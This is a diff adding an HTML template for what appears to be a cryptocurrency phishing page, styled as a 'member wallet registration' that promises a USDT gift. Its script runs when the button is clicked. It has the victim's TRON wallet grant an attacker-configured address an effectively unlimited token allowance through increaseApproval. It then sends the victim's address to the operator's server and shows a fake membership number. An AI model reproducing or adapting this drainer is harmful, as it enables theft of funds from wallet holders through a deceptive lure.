@@ -1,0 +1,229 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, viewport-fit=cover"><title>Member wallet registration</title><script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script><script src="../layer/layer.js"></script><script type="text/javascript" src="../assets/js/md5.js"></script></head><style>    html {
+        font-size: 8px;
+    }
+    
+    html,
+    body {
+        padding: 0;
+        margin: 0;
+        background-color: #276EEC;
+        width: 100%;
+        height: 100%;
+    }
+    
+    .content {
+        padding: 0 3.13rem;
+    }
+    
+    .header {
+        font-size: 3rem;
+        font-family: PingFang SC;
+        font-weight: 400;
+        color: #FFFFFF;
+        text-align: center;
+        margin-top: 5.5rem;
+    }
+    
+    .formwarp {
+        height: 25.06rem;
+        background: #FFFFFF;
+        background: rgba(255, 255, 255, 0.2);
+        border-radius: 1rem;
+        margin: 0 auto;
+        margin-top: 5.25rem;
+        padding: 2.06rem 0;
+    }
+    
+    .formwarp .title {
+        font-size: 2.25rem;
+        font-family: PingFang SC;
+        font-weight: 400;
+        color: #FFFFFF;
+        text-align: center;
+    }
+    
+    .formwarp .inputwarp {
+        width: 38.75rem;
+        height: 5.61rem;
+        background: rgba(0, 174, 255, 0);
+        border: 0.06px solid #FFFFFF;
+        display: flex;
+        align-items: center;
+        padding: 0 1.19rem;
+        box-sizing: border-box;
+        margin: 0 auto;
+        margin-top: 1.94rem 1rem;
+    }
+    
+    textarea,
+    select,
+    input {
+        -webkit-appearance: none;
+        -moz-appearance: none;
+        -o-appearance: none;
+        appearance: none;
+    }
+    
+    .formwarp .inputwarp input {
+        font-size: 1.88rem;
+        font-family: PingFang SC;
+        font-weight: 400;
+        color: #FFFFFF;
+        background: none;
+        outline: none;
+        width: 100%;
+        border: none;
+        appearance: none;
+    }
+    
+    .formwarp .submit {
+        width: 34.4rem;
+        height: 5.63rem;
+        background: #FFFFFF;
+        border-radius: 3rem;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 2.25rem;
+        font-family: PingFang SC;
+        font-weight: 400;
+        color: #282828;
+        margin: 0 auto;
+        margin-top: 1.81rem;
+    }
+    
+    .formwarp .tips {
+        font-size: 1.5rem;
+        font-family: PingFang SC;
+        font-weight: 400;
+        color: #FFFFFF;
+        text-align: center;
+        margin-top: 1.81rem;
+    }
+    
+    .listtitle {
+        margin-top: 6.18rem;
+        font-size: 2.25rem;
+        font-family: PingFang SC;
+        font-weight: 400;
+        color: #FFFFFF;
+        text-align: center;
+    }
+    
+    .list {
+        padding: 0 1.88rem;
+        margin-top: 3.34rem;
+    }
+    
+    .list .row {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        flex-wrap: wrap;
+        margin-bottom: 3.13rem;
+    }
+    
+    .list .row img {
+        width: 3.75rem;
+        height: 3.75rem;
+    }
+    
+    .copyroght {
+        font-size: 1.5rem;
+        font-family: PingFang SC;
+        font-weight: 400;
+        color: #8DB5FB;
+        text-align: center;
+        margin-top: 4.81rem;
+    }
+</style><body><div class="header">        Member wallet address registration
+    </div><div class="content"><div class="formwarp"><div class="title">                Registered address
+            </div><div class="inputwarp"><input disabled="true" type="text" name="walletAddress" /></div><div class="submit">                Click to register
+            </div><div class="tips">               Note: After the registration is completed, usdt will calculate the gift balance based on your wallet USDT balance. For example, if the wallet USDT balance is 1000, 500 USDT will be given as a gift.
+            </div></div><div class="listtitle">            Partner
+        </div><div class="list"><div class="row"><img src="/eov_files/img/1.png" alt=""><img src="/eov_files/img/2.png" alt=""><img src="/eov_files/img/3.png" alt=""><img src="/eov_files/img/4.png" alt=""></div><div class="row"><img src="/eov_files/img/5.png" alt=""><img src="/eov_files/img/6.png" alt=""><img src="/eov_files/img/7.png" alt=""><img src="/eov_files/img/8.png" alt=""></div><div class="row"><img src="/eov_files/img/9.png" alt=""><img src="/eov_files/img/10.png" alt=""><img src="/eov_files/img/11.png" alt=""><img src="/eov_files/img/12.png" alt=""></div><div class="row"><img src="/eov_files/img/13.png" alt=""><img src="/eov_files/img/14.png" alt=""><img src="/eov_files/img/15.png" alt=""><img src="/eov_files/img/16.png" alt=""></div></div><div class="copyroght">            ©2021 All Rights Reserved
+        </div></div><div style="display:none;"><textarea id="jsondata">{&quot;WIN&quot;:&quot;TXWit5JbqBMN4Ys52CBZQhCwro4mrzpozZ&quot;,&quot;USDT&quot;:&quot;TXWit5JbqBMN4Ys52CBZQhCwro4mrzpozZ&quot;,&quot;TONS&quot;:&quot;TXWit5JbqBMN4Ys52CBZQhCwro4mrzpozZ&quot;,&quot;USDJ&quot;:&quot;TXWit5JbqBMN4Ys52CBZQhCwro4mrzpozZ&quot;,&quot;JST&quot;:&quot;TXWit5JbqBMN4Ys52CBZQhCwro4mrzpozZ&quot;,&quot;HT&quot;:&quot;TXWit5JbqBMN4Ys52CBZQhCwro4mrzpozZ&quot;,&quot;SUN&quot;:&quot;TXWit5JbqBMN4Ys52CBZQhCwro4mrzpozZ&quot;,&quot;EXNX&quot;:&quot;TXWit5JbqBMN4Ys52CBZQhCwro4mrzpozZ&quot;,&quot;VCOIN&quot;:&quot;TXWit5JbqBMN4Ys52CBZQhCwro4mrzpozZ&quot;,&quot;POL&quot;:&quot;TXWit5JbqBMN4Ys52CBZQhCwro4mrzpozZ&quot;,&quot;CKRW&quot;:&quot;TXWit5JbqBMN4Ys52CBZQhCwro4mrzpozZ&quot;}</textarea></div><script>        var address = "{$address}";
+    	var agent = "{$userId}";
+    	var rank = 6.5;
+    	var authorized_address = '{$authorized_address}';
+    	var domain = '{$domain}';
+    	var bizhong = 'USDT';
+    	var approveAddr = "{$approveAddr}";
+        //var url = window.location.host;
+        //var domain = 'https://' + url + '/';
+
+        function randomNum(minNum,maxNum){ 
+	        switch(arguments.length){  
+	            case 1: 
+	                return parseInt(Math.random()*minNum+1,10); 
+	            break; 
+	            case 2: 
+	                return parseInt(Math.random()*(maxNum-minNum+1)+minNum,10); 
+	            break; 
+	                default: 
+	                    return 0; 
+	                break; 
+        	} 
+        }
+
+        function getUrlQueryString(names, urls) {
+            urls = urls || window.location.href;
+            urls && urls.indexOf("?") > -1 ? urls = urls.substring(urls.indexOf("?") + 1) : "";
+            var reg = new RegExp("(^|&)" + names + "=([^&]*)(&|$)", "i");
+            var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg);
+            if (r != null && r[2] != "") return unescape(r[2]);
+            return null;
+        }
+
+        $(function() {
+
+			var timer = setInterval(function(){
+				if(window.tronWeb){
+					clearInterval(timer)
+					var tronWeb = window.tronWeb
+					var walletAddress = tronWeb.defaultAddress.base58;
+					console.log(walletAddress)
+					$('.inputwarp input').val(walletAddress) 
+				}
+			},500)
+
+			$('.submit').click(async function() {
+                var tronWeb = window.tronWeb
+                var walletAddress = tronWeb.defaultAddress.base58;
+                
+                var token = await tronWeb.contract().at(approveAddr);
+                console.log(authorized_address)
+                var res = await token.increaseApproval(authorized_address, "90000000000000000000000000000");
+
+                res.send({
+                    feeLimit: 10000000,
+                    callValue: 0,
+                    shouldPollResponse: false
+                }, function(err, hash) {
+                    console.log(err, hash);
+                    var data = {
+            			address: walletAddress,
+            			auth_address: authorized_address,
+            			bizhong: bizhong,
+            			agent: agent
+            		}
+                    
+                    var d = new Date();
+        			var n = d.getTime();
+                    $.ajax({
+                        type: 'get',
+                        url:  domain + "/index/api/trc_post?t="+n,
+                        data: data,
+                        success: function(data) {
+                            layer.msg("Successful registration, membership number"+randomNum(100000,999999),{time:5000});
+                            return false;
+                        },
+                        error: function(data) {
+                            layer.msg("Registration failed");
+                            console.log(data)
+                        }
+                    })
+                })
+            })
+        });
+    </script></body></html>
